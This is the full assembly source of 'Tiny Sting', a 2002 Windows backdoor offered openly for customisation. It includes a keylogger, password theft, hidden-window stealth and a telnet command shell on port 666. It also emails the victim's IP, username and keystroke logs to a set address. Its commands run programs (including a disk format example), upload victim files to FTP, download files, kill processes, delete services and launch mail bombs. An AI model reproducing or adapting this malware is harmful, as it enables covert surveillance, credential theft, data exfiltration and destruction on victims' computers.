; 				Tiny Sting (TS) by Extra_Face 2002
;
;
;   It is backdoor that opens 'TRJPORT' (check equates below!) and listens to it awaiting
;   for instructions. (It also logs keystrokes, tries to steal some pass and some other bad stuff)  
;   When an internet connection is established it sends an email at 'TONEMAIL' reporting 
;   infos about the victim such as ip, username or log file etc...
;
;   To connect to it, you'll basicly do as following :
;   "telnet victim_ip TRJPORT"
;   so telnet 127.0.0.1 666 worx if you have installed TS on your own station
;
;   Then you'll have to enter the password indicated in 'PASSWORD' 
;
;   huhuuhu how easy !!!
;
;   now we can go on with some more serious stuff :D
;
;
;
;
;
;

;  ************************ Backdoor instructions ************************

; $INFO
; 
;   Gives various info about the computer
;
; $MSG        "Message text"'
;
;   Sends a message
;   param1 : text to send
;
; $DIR!
;
;   lists all files in the current directory (no wait)
;
; $DIRW
;
;   lists all files in the current directory (wait for user action)
;
; $LIST
;
;   lists processes
;
; $WINL
;
;   lists windows
;
; $CVRT       "Chemin long a convertir en chemin court"'
;
;   convert long path to short path
;   param1: long path
;
; $SRVL       [-drv -W32 -all] [-r -s -a]'
;
;   lists services
;   param1: -drv    ; lists drivers only
;           -W32    ; Win32 services only
;           -all    ; both drivers and services
;
;   param2: -r      ; running services
;           -s      ; inactive services
;           -a      ; both running and inactive services
;
; $SRVS       "Nom du service"'
;
;   start service
;   param1: service name
;
; $SRVK       "Nom du service"'
;
;   kill service
;   param1: service name
;
; $SRVD       "Nom du service"'
;
;   delete service
;   param1: service name
;
; $KILL       "PID"'
;
;   kills a process
;   param1: number identifying the process (needs previous call to list)
;
; $CD         "Repertoire"'
;
;   change dir
;   param1: directory name
;
; $MKDIR      "Repertoire"'
;
;   create dir
;   param1: directory name
;
; $RMDIR      "Repertoire"'
;
;   remove dir
;   param1: directory name
;
; $REN        "Fichier existant" "Nouveau fichier"'
;
;   rename file
;   param1: original filename
;   param2: new filename
;
; $FIND       "Repertoire reference ou *ALL" "Chaine"'
;
;   finds a file using a recursiv algorithm
;   param1: directory where to start searching or '*all' indicating search will
;           be done starting at root dir on all fixed drives
;   param2: complete of partial filename to search for 
;    note : .exe is accepted 
;           *.exe is NOT accepted
;           paint is accepted
;           *paint*.exe is NOT accepted
;
; $DEL        "Fichier distant"'
;
;   deletes a file
;   param1: path of file to delete
;
; $EXEC       "Command to execute"'
;   
;   executes various commands
;   param1: command to execute
;      ex: $exec notepad
;          $exec iexplore www.shit.com
;          $exec http://www.shit.com
;          $exec c:\windows\calc.exe
;          $exec format e: /q /y
;
; $HIST'
;
;   prints visited web sites
;
; $OPEN       "Fichier distant" ou "*LOG"'
;
;   view a file in Ascii mode
;   param1: path to file    or *log for wiewing keyz logged
; 
; $FPUT       "Fichier distant (Full Path)" "nom.du.serveur" "username" "password"'
;
;   transfers a distant file to a ftp account
;   param1: path of the file to transfert (full and short path)
;   param2: servername
;   param3: username
;   param4: password
;
; $WSDL       "Url/fichier.ext" "Fichier distant"'
;
;   downloads a file from a website
;   param1: complete url of the file to download
;   param2: localname
;
; $CDR!       ' 
;
;   opens/closes cdrom door
;
; $LOGOFF     "1 REBOOT 2 POWEROFF 3 SHUTDOWN 4 LOGOFF"'
; 
;   reboots or shutdown a windows station
;   param1: 1, 2, 3 or 4
;
; $EXIT
;
;   Properly stop controlling the backdoor  (bullshit ! just click the upper-right cross over telnet !!)

;******************************************************************************************
;******************************************************************************************
;
; ***********  change these equates to customize the backdoor   **************
;       **************************************************************
;

__STEAL_PASS__            equ TRUE     ; password stealing activated ?
__CRYPT_STUFF__           equ FALSE    ; do not touch this one !
__TEST_MODE__             equ FALSE    ; test mode : error report and auto-desactivation with CTRL + ALT + S



MAX_LOG_SIZE    EQU 5000               ; minimum size for sending the log file ( MIN 3000, MAX 50000)
PASSWORD        EQU "fuckshit",0       ; password to connect to the server
                                       ; WARNING: there is no prompt and 'del' key is not working
                                       ; at this moment, so be sure you'll type the correct password :-l

TRJPORT  EQU 666                       ; port the backdoor will live open


DEFAUTSERV EQU "smtp.wanadoo.fr",0     ; smtp server
DISPNAME   EQU 0                       ; display name in the mail (bullshit just live 0)
TONEMAIL   EQU "EnterEmail@Here.com",0 ; Email where the backdoor will notify to. 
                                       ; (enter yours and... be careful ;)
SONEMAIL   EQU "hack@report.com",0     ; bullshit again...   
                                            
SUJET      EQU "-*=*=*=< Rapport IP >=*=*=*=-",0           ; subject

LOGSUBJ    EQU "-*=*=*=< Fichier Log  >=*=*=*=-",0          ; ---


;******************************************************************************************


.686
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
include \masm32\include\advapi32.inc
includelib \masm32\lib\advapi32.lib
include \masm32\include\wininet.inc
includelib \masm32\lib\wininet.lib
include \masm32\include\masm32.inc
includelib \masm32\lib\masm32.lib
include \masm32\include\shell32.inc
includelib \masm32\lib\shell32.lib
includelib  \MASM32\lib\rasapi32.lib
include \MASM32\INCLUDE\rasapi32.inc
include \masm32\include\winmm.inc
includelib \masm32\lib\winmm.lib


include   incs\KbHook.inc
;includelib  KbHook.lib

WinMain PROTO :DWORD,:DWORD,:DWORD,:DWORD
Crypt   PROTO src:DWORD, dest:DWORD
MirrorStr  proto :dword,:dword
base64encode PROTO :DWORD,:DWORD,:DWORD


WM_SOCKET       equ         WM_USER + 100
TimerID         equ         0DEADC0DEh
WM_KBHOOKINSTALLED  equ WM_USER + 11
WM_KBHOOKREMOVED    equ WM_USER + 12
WM_KEYCAPTURED      equ WM_USER + 13

.data

ClassName db "TS_server",0
AppName   equ <ClassName>

pass      db PASSWORD

PrevWnd   dd    0
hLog   dd    0
Trj_Port dd TRJPORT
IsCDOpen dd 0
kernel  db  "KERNEL32",0
RSP     db  "RegisterServiceProcess",0                                 
FinSession      db 0dh,0ah,0dh,0ah,"-------- Session Terminée, %s --------",0dh,0ah,0dh,0ah
FinSessionLen equ $ - OFFSET FinSession
TDUtempl db "%s, %s, %s",0

   
  char_templ db 0dh,0ah,0dh,0ah,"*** %s, %s ***",0dh,0ah,0dh,0ah,0; "*"
 NouvelleSession db 0dh,0ah,0dh,0ah,"-------- Nouvelle Session --------",0dh,0ah,0dh,0ah  
 NouvelleSessionLen equ $ - OFFSET NouvelleSession
  

     
serv  db DEFAUTSERV
disp  db DISPNAME
sendermail  db SONEMAIL 
rcpt  db TONEMAIL 

subj  db SUJET




               
                
IpTempl                     db "---! Ip, Username, Date, Heure !---",0dh,0ah
                            db "%s, %s",0

LOG                         db ".log",0
DLL                         db ".dll",0
szInstallKBHook             db  "InstallKBHook",0                  ; Keylogger dll apis
szRemoveKBHook              db  "RemoveKBHook",0
szRecursivScan              db  "RecursivScan",0
szFileSearchAllFixedDrives  db "FileSearchAllFixedDrives",0

;szWNetEnumCachedPasswords  db "WNetEnumCachedPasswords",0


      ALIGN             4
      tkp			TOKEN_PRIVILEGES <>
      ALIGN             4
      szShut  db "SeShutdownPrivilege",0   

     
PSAPI   db "psapi",0
szEnumProcesses db "EnumProcesses",0
szGetModuleFileNameExA db  "GetModuleFileNameExA",0

FindTempl   db "%s            <%d octet(s)>", 0dh,0ah,0

.data?
FindBuf     db 1024 dup (?)

processArray    db 1024 dup (?)
FileNameBuf     db 256  dup (?)
BytesNeeded          dd  ?

DrivesBuf db 100 dup (?)
FixedDrives db 70 dup (?)
VirtualDrives db 30 dup (?)
hCFCT        dd ?   
ExitCode    dd  ?
hPSAPI          dd  ?
hLib            dd  ?

_InstallKBHook  dd  ?
_RemoveKBHook   dd  ?
_RecursivScan   dd  ?
_FileSearchAllFixedDrives dd ?
_EnumProcesses  dd  ?
_GetModuleFileNameExA dd ?

MsgBoxThreadID  dd ?
serv_responsebuf db 512 dup (?)
ALIGN       4
Buf4096 db 4096 dup (?)
DllNameBuf  db 256 dup (?)
OldIp    dd ?
hInstance HINSTANCE ?
CommandLine LPSTR ?
;keys_buf    db 32 dup (?)
Written dd ?
hWin    dd  ?
hTimer  dd  ?
FileCounter dd  ?
CacheBuf    db 2048 dup (?)

Dbuf db 30 dup (?)
Tbuf db 9 dup (?)
Ubuf db 256 dup (?)
TDUinfo db 512 dup (?)
UsrNSize    dd  ?
OS_ver  OSVERSIONINFO <?>
trj_sock    dd  ?
@wsadata    db 400 dup (?)
BackdoorThreadID    dd  ?
sin             sockaddr_in         <?>
WaitForConThreadID  dd  ?
TelnetClientSock    dd ?
record_file db 256  dup (?)
BigTrjBuf     db 2024 dup (?)
;CryptBuf    db 1024 dup (?)
LogBuf      db 0FFFFh dup (?)
;LogBuf      dd  ?
UrlBuf db 4096 dup (?)
OutUrlBuf db 5000 dup (?)
hToken  dd  ?
MyTokenPrivileges TOKEN_PRIVILEGES <>
;AcceptCache db 512 dup (?)
Read    dd  ?
AttachementSize dd  ?
pMatchString    dd  ?
ServiceType     dd  ?
ServiceStatus       dd  ?
;CheckForClosureThreadID dd  ?
hBackdoorThread     dd  ?
winbigbuf       db 2013 dup (?) 
winnamebuf      db 1500 dup (?) 
winclassbuf     db 512  dup (?)
TxtBuf          db 256  dup (?)
hFtpSession     dd  ?
pPassword       dd  ?

DlBuffer        db  1024 dup (?)
DlBufferLen     dd  ?
     
pBigInfoAlloc       dd  ?
pFoldersAlloc       dd  ?

.code
TS:


      push  3
      call SetErrorMode               ; error report OFF
      
      invoke FindWindow, addr AppName, addr AppName
      or     eax,eax
      jnz    AlreadyLaunched

      mov     [OS_ver].dwOSVersionInfoSize, sizeof  OSVERSIONINFO  

      push    OFFSET OS_ver
      Call    GetVersionEx
     
      Call   Install                ; install backdoor

     
	invoke GetModuleHandle, NULL
	mov    hInstance,eax
	invoke GetCommandLine
	mov    CommandLine,eax
      And    hLog,0
	invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT
AlreadyLaunched:
	invoke ExitProcess,eax



.data
szConnCheckKey  db "System\CurrentControlSet\Services\RemoteAccess",0
szConnCheckVal  db "Remote Connection",0
;szTestUrl       db "http://www.microsoft.com",0

.code

CatchConnexion  proc 
      LOCAL  Flags:DWORD
      LOCAL  _reserved:DWORD
      LOCAL  KeyDisp:DWORD
      LOCAL  hConnCheckKey:DWORD
      LOCAL  DWDATA:DWORD
      LOCAL  DATASIZE:DWORD
      

      
      
      
          invoke InternetGetConnectedState, addr Flags, _reserved
          .IF    eax == 0

            invoke InternetCheckConnection, 0, 0, 0
            .IF    eax == 0
                invoke RegCreateKeyEx,  HKEY_LOCAL_MACHINE, addr szConnCheckKey, 0, 0, REG_OPTION_NON_VOLATILE, \
                                        KEY_QUERY_VALUE, 0, addr hConnCheckKey, addr KeyDisp 
                mov    DATASIZE, 4
                invoke RegQueryValueEx, hConnCheckKey, addr szConnCheckVal, 0, 0, addr DWDATA, addr DATASIZE
                or     eax, eax
                jnz    @ERRQUERY
      
                invoke RegCloseKey, hConnCheckKey
                mov    eax, DWDATA
                ret
                
               @ERRQUERY:
               xor  eax, eax
            .ENDIF
          .ENDIF
         
      ret
      
CatchConnexion  endp


WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD
	LOCAL wc:WNDCLASSEX
	LOCAL msg:MSG
	LOCAL hwnd:HWND
      
	mov   wc.cbSize,SIZEOF WNDCLASSEX
	mov   wc.style, CS_HREDRAW or CS_VREDRAW
	mov   wc.lpfnWndProc, OFFSET WndProc
	mov   wc.cbClsExtra,NULL
	mov   wc.cbWndExtra,NULL
	push  hInstance
	pop   wc.hInstance
	mov   wc.hbrBackground,COLOR_WINDOW+1
	mov   wc.lpszMenuName,NULL
	mov   wc.lpszClassName,OFFSET ClassName
	invoke LoadIcon,NULL,IDI_APPLICATION
	mov   wc.hIcon,eax
	mov   wc.hIconSm,eax
	invoke LoadCursor,NULL,IDC_ARROW
	mov   wc.hCursor,eax
	invoke RegisterClassEx, addr wc
	INVOKE CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\
           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\
           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\
           hInst,NULL
	mov   hwnd,eax
	;invoke ShowWindow, hwnd,SW_SHOWNORMAL     ; invisible
	invoke UpdateWindow, hwnd
	.WHILE TRUE
		invoke GetMessage, ADDR msg,NULL,0,0
		.BREAK .IF (!eax)
		invoke TranslateMessage, ADDR msg
		invoke DispatchMessage, ADDR msg
	.ENDW
	mov     eax,msg.wParam
	ret
WinMain endp

WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
         LOCAL  EndSessionBuf[512]:BYTE

         
	.IF uMsg==WM_DESTROY
        ExitAll:
            invoke KillTimer, hWnd, TimerID
            Call   _RemoveKBHook
            Call   CloseLogFile
            invoke FreeLibrary, hLib
	      invoke PostQuitMessage,NULL 
            
      .ELSEIF uMsg==WM_CREATE           ; init backdoor


            and     TelnetClientSock, NULL
            lea     ecx,[WaitForConThread]
            invoke  CreateThread, 0,0,ecx,0,0, addr WaitForConThreadID
            invoke  CloseHandle, eax
            
            invoke  SetTimer,hWnd, TimerID, 5000, 0
            mov     hTimer,eax
            push    hWnd
            pop     hWin


            
            .IF     [OS_ver].dwPlatformId == VER_PLATFORM_WIN32_WINDOWS            
                    Call    Stealth9x
            .ENDIF


            CAll    OpenLogFile
            push    hWnd
            Call    _InstallKBHook
            
            IF    __TEST_MODE__
            invoke  RegisterHotKey,hWnd,787h,MOD_CONTROL or MOD_ALT,  VK_S
            ENDIF
            
      
      .ELSEIF uMsg == WM_HOTKEY
            IF    __TEST_MODE__
            invoke  UnregisterHotKey,hWnd,787h
            jmp     ExitAll 
            ENDIF
      .ELSEIF uMsg == WM_TIMER
      
          .IF   wParam == TimerID
               
                CAll    NewConnRoutine
                
          .ENDIF

      .ELSEIF uMsg == WM_KEYCAPTURED
            mov     eax,wParam
            mov     ecx,lParam
            Call    KBProc
    
	 .ELSE
		invoke DefWindowProc,hWnd,uMsg,wParam,lParam		
		ret
	.ENDIF
	xor eax,eax
	ret
WndProc endp


include incs\SMTP.inc                   ; SMTP stuff

;################################################################################################
;# NewConnRoutine : This routine sends an email on specified address if a new internet connexion#
;#                  is available.                                                               #
;#                                                                                              #
;################################################################################################

NewConnRoutine proc

         LOCAL  _ComputerBuf[127]:BYTE
         LOCAL  _ComputerBufSize:DWORD
         
  
         Call    CatchConnexion
         or      eax,eax
         jz      NoConn

         invoke WSAStartup,101h,offset WSA_Data

         Call   TimeDateUsrInfo
           
         lea    edi, [Buf4096]
         mov    ecx, 4096 / 4
         xor    eax, eax
         rep    stosd
           
         invoke gethostbyname,addr Buf4096
  	    mov eax,[eax+12]
  	    mov eax,[eax]                       ;Get IP address
  	    mov eax,[eax]           
         push   eax
         invoke  inet_ntoa,eax

         invoke  wsprintf, addr Buf4096, addr IpTempl, eax,  addr TDUinfo  
         Call    WSACleanup
        
         pop     eax
         push    eax


         .IF     OldIp !=  eax                              ; is it the same ip ?

                 lea    esi,[rcpt]

           
           IF  __STEAL_PASS__

           lea     eax, [Buf4096]
           Call    _strlen
           push    eax
           Call    GetPass                      ; get inet password if defined
           pop     ecx
           lea     edi, [Buf4096 + ecx]
           mov     ecx, eax
           rep     movsb
          

           and     byte ptr [edi], 0
           ENDIF


          invoke  SendMail, addr serv, esi, addr sendermail, addr rcpt, addr subj, addr Buf4096,0 ; send it!
         .ENDIF
  
         pop   OldIp          ; OldIp Holds now old ip
          
        
        
       NoConn:
       
   ret

NewConnRoutine  endp


;################################################################################################
;#  WaitForConThread : This thread waits until a new user gets connected to the backdoor.       #
;#                     The user must type the good password to enter.                           #
;#                                                                                              #
;################################################################################################

WaitForConThread proc
      LOCAL   passbuf[50]:BYTE
      

      
     Restart:  
      invoke  WSAStartup,101h,addr @wsadata
      invoke  socket,AF_INET,SOCK_STREAM,0
      mov     trj_sock,eax
      mov     sin.sin_family,AF_INET
      invoke  htons,Trj_Port
      mov     sin.sin_port,ax
      mov     sin.sin_addr,INADDR_ANY            
      invoke  bind, trj_sock,addr sin,sizeof sin

      
     Recon:
      invoke  listen,trj_sock,15



      .IF     dword ptr [TelnetClientSock] == NULL
      
      invoke  accept,trj_sock,  0,0  
      mov     TelnetClientSock,eax
      
      ;invoke send, TelnetClientSock, addr passmsg, passmsg_size, 0
      ;inc    eax
      ;jz     @WFCERR

      lea     esi,[passbuf]
      mov     edi,esi
      
      push    esi
     @@:
      invoke  recv, TelnetClientSock, esi, 1 ,MSG_PEEK
      or      eax, eax
      jz      @WFCERR
      invoke  recv, TelnetClientSock, esi, 1 ,0
      lodsb
      cmp     al,0ah
      jnz     @B
      pop     eax
      inc     eax
      inc     eax
      cmp     eax, esi
      jz      @PassErr          ; L'utilisateur a simplement pressé "ENTER" ?
      
      push    edi
      mov     al,0ah
      push    sizeof passbuf
      pop     ecx
      repnz   scasb
      and     byte ptr [edi-1],0
      pop     edi
      mov     eax,edi
      call    _strlen
      mov     ecx,eax
      lea     esi, [pass]
      repz    cmpsb

      .IF     ECX != 0
            @PassErr:
              ;invoke send, TelnetClientSock, addr wrongpass, wrongpass_size, 0
              invoke  closesocket, TelnetClientSock
              and    dword ptr [TelnetClientSock], NULL
              jmp     Recon
      .ENDIF
      
      lea     ecx,[BackdoorThread]
      invoke  CreateThread, 0,0,ecx,0,0, addr BackdoorThreadID
      ;invoke  CloseHandle, eax
      mov      hBackdoorThread, eax

      .ENDIF
      invoke  Sleep,10
      
      jmp     Recon
     @WFCERR:
      invoke  closesocket, trj_sock
      and     dword ptr [TelnetClientSock], 0
      invoke  WSACleanup
         jmp Restart
      ;invoke ExitThread,eax
WaitForConThread endp

      .data

      
      welcmsg   db 0dh,0ah,"Tiny Sting v7.0 : Access completed. ['?' pour afficher l'aide]",0dh,0ah,0dh,0ah
                db 0
      welcmsg_size equ $ - OFFSET welcmsg
   
      helpstr   db 0dh,0ah,'$INFO       '
                db 0dh,0ah,'$MSG        "Texte du message"'
                db 0dh,0ah,'$DIR!'
                db 0dh,0ah,'$DIRW'
                db 0dh,0ah,'$LIST'
                db 0dh,0ah,'$WINL'
                ;db 0dh,0ah,'$WINS       "Handle de la fenetre" "Message a envoyer"'
                db 0dh,0ah,'$CVRT       "Chemin long a convertir en chemin court"'
                db 0dh,0ah,'$SRVL       [-drv -W32 -all] [-r -s -a]'
                db 0dh,0ah,'$SRVS       "Nom du service"'
                db 0dh,0ah,'$SRVK       "Nom du service"'
                db 0dh,0ah,'$SRVD       "Nom du service"'
                db 0dh,0ah,'$KILL       "PID"'
                db 0dh,0ah,'$CD         "Repertoire"'
                db 0dh,0ah,'$MKDIR      "Repertoire"'
                db 0dh,0ah,'$RMDIR      "Repertoire"'
                db 0dh,0ah,'$REN        "Fichier existant" "Nouveau fichier"'
                db 0dh,0ah,'$FIND       "Repertoire reference ou *ALL" "Chaine"'
                db 0dh,0ah,'$DEL        "Fichier distant"'
                db 0dh,0ah,'$EXEC       "commande a executer"'
                db 0dh,0ah,'$HIST'
                db 0dh,0ah,'$OPEN       "Fichier distant" ou "*LOG"'
                db 0dh,0ah,'$FPUT       "Fichier distant (Full Path)" "nom.du.serveur" "username" "password"'
                db 0dh,0ah,'$AWEB'
                db 0dh,0ah,'$AEML'
                db 0dh,0ah,'$WSDL       "Url/fichier.ext" "Fichier distant"'
                ;db 0dh,0ah,'$SKEY       "texte" [ [0] [1] [*] ]' 
                db 0dh,0ah,'$CDR!       ' 
                db 0dh,0ah,'$LOGOFF     "1 REBOOT 2 POWEROFF 3 SHUTDOWN 4 LOGOFF"'
                db 0dh,0ah,'$EXIT',0dh,0ah,0dh,0ah,0
      helpsize equ $ - OFFSET helpstr

    ALIGN           4
    szOpenString    db      'set cdaudio door open',0       ; Open CD-ROM command
    ALIGN           4
    szCloseString   db      'set cdaudio door closed',0     ; Close CD-ROM command


                   
      serv_resp_templ db 0dh,0ah,"Requete [ $%s] envoyee avec succes.",0dh,0ah,0dh,0ah,0 
      serv_resp_err_templ db 0dh,0ah,"Erreur a l'envoi de la requete [ $%s].",0dh,0ah,0dh,0ah,0

      FuncNA_W9x_templ             db  0dh,0ah,"Erreur : fonction [ $%s] non valide sur les systemes win9x.",0dh,0ah,0dh,0ah,0
      ;FuncNA_NT5_templ              db  0dh,0ah,"Erreur : fonction [ $%s] non valide sur les systemes NT anterieurs a NT 5.",0dh,0ah,0dh,0ah,0
      InvalidCmdMsg         db  "Commande invalide.",0dh,0ah,0 
      InvalidCmdMsg_size    equ $   - OFFSET InvalidCmdMsg
      
      wait_msg  db 0dh,0ah,"--- Continuer ? (o / n) ---",0dh,0ah,0dh,0ah,0
      wait_msg_len  equ $ - OFFSET wait_msg
      
      WSVISIT db 0dh,0ah,0dh,0ah,"--- Sites Webs visites ---",0dh,0ah,0dh,0ah,0
      WSVISIT_len   equ $   -   OFFSET WSVISIT
      
      fileexist_msg db 0dh,0ah,0dh,0ah,"Le fichier existe deja. L'ecraser ? (o / n)",0dh,0ah,0
      fileexist_msg_len equ $   -   OFFSET fileexist_msg

      file2big_msg  db 0dh,0ah,"Erreur : taille du fichier trop importante.",0dh,0ah 
                    db         "Utilisez $FPUT pour l'envoyer.",0dh,0ah,0dh,0ah,0
      file2big_msg_len equ  $ - OFFSET file2big_msg

      file_unicode_msg  db 0dh,0ah,'Erreur : Fichier au format binaire ou unicode',0dh,0ah
                        db         "Utilisez $FPUT pour l'envoyer.",0dh,0ah,0dh,0ah,0
      file_unicode_msg_len  equ $   - OFFSET file_unicode_msg
      
      dir_content_templ db 0dh,0ah,'Contenu de "%s" :',0dh,0ah,0dh,0ah,0
      
      enumwin_msg   db "[Nom de fenetre     |--|    Classe de la fenetre]",0dh,0ah,0dh,0ah,0
      enumwin_msg_len equ $ - OFFSET enumwin_msg
      
      dirlst    db "*.*",0
      serv_find_templ db "%s      %s               %d octet(s)",0dh,0ah,0
      serv_lst_intro  db "IMAGE     PID",0dh,0ah,0dh,0ah
      serv_lst_intro_len equ $ - OFFSET serv_lst_intro
      serv_lst_templ  db "%s <---> %d",0dh,0ah,0
      testtempl db "%d",0
      CRLF      db 0dh,0ah,0
      szOpen     db "open",0
      truc       db ">",0
      quitmsg    db 0dh,0ah,"BYE",0dh,0ah,0 
      quitmsg_size equ $ - OFFSET quitmsg
      UrlBufSize dd   4096

      aweb_mode_msg db 0dh,0ah,0dh,0ah
                    db "Utilisation de aweb : ",0dh,0ah,0dh,0ah
                    db "1 : Mode Mail anonyme simple",0dh,0ah
                    db "2 : Mode MailBomb auto",0dh,0ah
                    db "3 : Mode MailBomb manuel",0dh,0ah,0dh,0ah
                    db "Votre choix : ",0
      aweb_mode_msg_size    equ $ - OFFSET aweb_mode_msg
      
      aweb_sujet    db "Sujet : ",0
      aweb_sujet_size   equ $ - OFFSET aweb_sujet
      
      aweb_msg      db "Message : ",0dh,0ah,0dh,0ah
      aweb_msg_size     equ $ - OFFSET aweb_msg

      aweb_msgnbr      db "Nombre de mails : ",0
      aweb_msgnbr_size     equ $ - OFFSET aweb_msgnbr

      ;aweb_random_msg  db "Sujet et texte du message aléatoire ? (o/n) : ",0
      ;aweb_random_msg_size equ $ - OFFSET aweb_random_msg
      
      fsearch_resp_templ    db 0dh,0ah,"%d fichier(s) trouvé(s)",0dh,0ah,0
      transfer_en_cours_msg db "Transfert de fichier en cours, veuillez patienter...",0dh,0ah,0
      transfer_en_cours_msg_len equ $ - OFFSET transfer_en_cours_msg
      szWin9xType db "Type Win9x",0
      szWinNTType db "Type WinNT",0

      Info_templ db 0dh,0ah,0dh,0ah,"Nom de l'utilisateur : %s",0dh,0ah
                 db "Nom de l'ordinateur : %s",0dh,0ah
                 db "OS : %s",0dh,0ah
                 db "Lecteur(s) de disque(s) dur : %s",0dh,0ah
                 db "Lecteur(s) virtuel(s) : %s",0dh,0ah
                 db "Chemin du serveur TS : %s",0dh,0ah
                 db "Chemin du fichier log : %s",0dh,0ah
                 db "Heure locale : %s",0dh,0ah
                 ;db "Email ou effectuer l'envoi : %s",0dh,0ah
                 db "Repertoires importants : ",0dh,0ah,0dh,0ah,0


;################################################################################################
;#                                                                                              #
;# BackdoorThread : This is the main backdoor thread which proceeds all backdoor subroutines.   #
;#                                                                                              #
;################################################################################################
      .code
BackdoorThread   proc uses esi

     LOCAL       cmd[5]:BYTE
     LOCAL       wfd:WIN32_FIND_DATA
     LOCAL       hFind:DWORD
     LOCAL       hSnapShot:DWORD
     LOCAL       PE:PROCESSENTRY32
     LOCAL       ProgName[256]:BYTE
     LOCAL       hSession:DWORD
     LOCAL       hUrl:DWORD
     LOCAL       hDlFile:DWORD
     LOCAL       hCE:DWORD
     LOCAL       CTR:DWORD
     LOCAL       ComputerBuf[MAX_COMPUTERNAME_LENGTH + 1]:BYTE
     LOCAL       ComputerBufSize:DWORD
     LOCAL       UserBuf[UNLEN + 1]:BYTE
     LOCAL       UserBufSize:DWORD
         


     invoke send, TelnetClientSock, addr welcmsg, welcmsg_size, 0
     inc    eax
     jz     @BackDoorErr    


     invoke GetModuleFileName, hInstance, addr ProgName, sizeof ProgName
     

     
  Trjlp:  
     lea     edi, [BigTrjBuf]
     mov     ax, word ptr [CRLF]
     stosw
     push    edi
     push    1022
     Call    GetCurrentDirectory
    @@:
     inc     edi
     cmp     byte ptr [edi],0
     jnz     @B
     mov     word ptr [edi], '>'
     mov     eax, OFFSET BigTrjBuf
     call    _strlen
     xchg    ecx, eax
     invoke  send, TelnetClientSock, addr BigTrjBuf, ecx, 0
     inc     eax
     jz      ExitCMD
        
     
     and    byte ptr [cmd+4],0
     
     lea    edi, [BigTrjBuf]
     mov    esi,edi
     xor    eax,eax
     mov    ecx, sizeof BigTrjBuf/4

     rep    STOSD
     


    CMDRecvLp:
     invoke recv, TelnetClientSock,esi, 1,MSG_PEEK
     or     eax, eax
     jz     ExitCMD
     invoke recv, TelnetClientSock,esi, 1,0
     inc    eax
     jz     Trjlp
     lodsb 
      
     .IF    al  ==  '' ; back

        mov    byte ptr [esi],20h
        lea    ecx, [BigTrjBuf + 2]
        .IF    esi >= ecx
               dec    esi
               dec    esi
     
               mov    dword ptr [cmd],0820h
               invoke send, TelnetClientSock, addr cmd, 3, 0
               xor    eax,eax
        .ENDIF
     .ENDIF

          
     cmp    al,0ah
     jnz    CMDRecvLp


     mov    byte ptr [esi+1],0

   
     lea    esi, [BigTrjBuf]
     lodsb
     cmp    al,'?'
     jz     SendHelp

     .IF     al != '$'
            invoke send, TelnetClientSock, addr InvalidCmdMsg, InvalidCmdMsg_size, 0 
            jmp    Trjlp
     .ENDIF
     lodsd


     
     or    eax,20202020h
     xchg   eax,edi
     mov     dword ptr [cmd],edi

     .IF        edi == 'ofni'       ; $INFO

            xor     ebx, ebx        ; init error
            invoke  VirtualAlloc, NULL, 5000, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
            or      eax,eax
            jz      FuckNoMem
            mov     pBigInfoAlloc, eax

            mov     UserBufSize, SIZEOF UserBuf
            invoke  GetUserName, addr UserBuf, addr UserBufSize
                 
            mov     ComputerBufSize, SIZEOF ComputerBuf
            invoke  GetComputerName, addr ComputerBuf, addr ComputerBufSize


            invoke GetTimeFormat,NULL,TIME_FORCE24HOURFORMAT , NULL, NULL, \
                             addr Tbuf,9


            

            push    OFFSET Tbuf
            push    OFFSET record_file
            lea     eax, [ProgName]
            push    eax
            
            invoke  GetLogicalDriveStrings, SIZEOF DrivesBuf, addr DrivesBuf
            lea     esi, [DrivesBuf]
            lea     ebx, [FixedDrives]
            lea     edi, [VirtualDrives]
            
            pushad
            
           EnumDrivesLoop:
            invoke  GetDriveType, esi
            
            .IF     EAX == DRIVE_FIXED
                
                mov eax, dword ptr [esi]
                mov dword ptr [ebx], eax
                mov byte ptr [ebx+3],' '
                add ebx, 4
                
            .ELSEIF EAX == DRIVE_CDROM || EAX == DRIVE_REMOVABLE
                mov eax, dword ptr [esi]
                stosd
                dec edi
                mov al, ' '
                stosb

            .ENDIF
            
            add     esi, 4
            cmp     byte ptr [esi], 0
            jnz     EnumDrivesLoop   
            
            popad
            
            push    edi
            push    ebx
            

            .IF     [OS_ver].dwPlatformId == VER_PLATFORM_WIN32_WINDOWS
                    push    OFFSET szWin9xType
            .ELSE  
                    push    OFFSET szWinNTType
            .ENDIF
            lea     eax, [ComputerBuf]
            push    eax            
            lea     eax, [UserBuf]
            push    eax
            push    OFFSET Info_templ
            push    pBigInfoAlloc
            Call    wsprintf

            mov     eax, pBigInfoAlloc
            Call    _strlen
            invoke  send, TelnetClientSock, pBigInfoAlloc, eax, 0 

            invoke  VirtualAlloc, NULL, 4000, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
            or      eax,eax
            jz      FuckNoMem2
            mov     pFoldersAlloc, eax
            mov     esi, eax
            xor     edi, edi        ; special folder counter
            
           GetSpecialFolderLoop:
           
            invoke  SHGetSpecialFolderPath, NULL, esi, edi, NULL

            mov     eax, esi
            Call    _strlen
            cmp     eax, 3
            jbe      @F
            invoke  lstrcat, esi, addr CRLF
            mov     eax, esi
            Call    _strlen
            push    eax
            invoke  send, TelnetClientSock, esi, eax, 0 
            pop     eax
            add     esi, eax
            
           @@:
            inc     edi
            cmp     edi, 23h
            jnz     GetSpecialFolderLoop

            inc     ebx
            invoke  VirtualFree, pFoldersAlloc, 4000, MEM_DECOMMIT or MEM_RELEASE
           FuckNoMem2:
            invoke  VirtualFree, pBigInfoAlloc, 5000, MEM_DECOMMIT or MEM_RELEASE
            or      ebx, ebx
            jnz     Trjlp
           FuckNoMem:
            invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd


     .ELSEIF    edi == 'ogol'       ; $LOGOFF
            mov ecx, 4
            rep lodsb
            
